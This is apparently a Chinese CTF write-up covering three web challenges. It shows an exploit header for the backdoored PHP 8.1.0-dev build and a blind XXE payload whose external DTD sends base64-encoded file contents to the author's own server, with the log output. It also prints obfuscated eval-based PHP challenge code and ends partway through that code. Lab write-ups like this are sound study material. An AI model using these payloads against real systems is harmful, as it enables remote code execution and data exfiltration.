---
title: CUMT-Competition-June
tags:
  - CUMT
  - CTF
categories: 
  - CTF
description: College CTF
excerpt: College CTF
typora-root-url: CUMT-Competition-June
abbrlink: 65207
date: 2021-06-03 21:44:03
---

> 整理一下这次比赛的Web题目

# CUMT CTF JUNE

## Web签到



F12查看返回的Header：

```http
X-Powered-By: PHP/8.1.0-dev
```

这个版本被人恶意植入过后门，直接利用后门获得flag。

```http
GET / HTTP/1.1

Host: 219.219.61.234:10015
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
User-Agentt: zerodiumecho file_get_contents('flag.php');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

添加`User-Agentt: zerodiumecho phpcode_here`利用即可。

## 别大E

> XXE的题目

弱口令猜中了没有什么用，抓包看下请求：

```http
POST /login.php HTTP/1.1

Host: 219.219.61.234:10017

Content-Length: 66

Accept: application/xml, text/xml, */*; q=0.01

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36

Content-Type: application/xml;charset=UTF-8

Origin: http://219.219.61.234:10017

Referer: http://219.219.61.234:10017/

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close

<user><username>admin</username><password>admin</password></user>
```

请求数据格式是`XML`，猜测可能是XXE注入，返回值比较固定，所以是无回显的XXE。

既然这样，直接试试打不打得通吧，直接添加实体，使其将flag编码发送至我们的服务器上。

替换XML数据为：

````xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./flag.php">
    <!ENTITY % dtd SYSTEM "https://blog.evalexp.ml/evil.dtd">
    %dtd;
    %send;
]>

<user><username>admin</username><password>admin</password>
````

其中，`blog.evalexp.ml`是我的博客地址，在发生请求前需要在博客根目录下创建evil.dtd文件，内容如下：

```dtd
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://blog.evalexp.ml/?data=%file;'>"
>
%all;
```

进而使得服务器在解析XML时包含我们的外部实体，然后向我们的服务器发生数据。

查看服务器日志可以得到：

```log
108.162.215.8 - - [28/May/2021:15:39:21 +0000] "GET /evil.dtd HTTP/1.1" 200 96 "-" "-"
172.69.35.33 - - [28/May/2021:15:39:24 +0000] "GET /?data=PD9waHANCiRmbGFnPSJjdW10Y3Rme3h4M19pc19WZVJ5X0U0c1l9IjsNCj9waHA+ HTTP/1.1" 200 5198 "-" "-"
```

base64解码后即可得到flag。

## EZ_getshell

代码是这样的：

```php
<?php
define('pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn', __FILE__);
$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{3} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{6} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{33} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30};
$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{33} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{10} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{10} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24};
$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{0} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{18} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{3} . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{0} . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{1} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24};
$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{7} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{13};
$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{22} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{36} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{29} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{26} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{32} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{35} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{26} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30};
eval($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC("JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo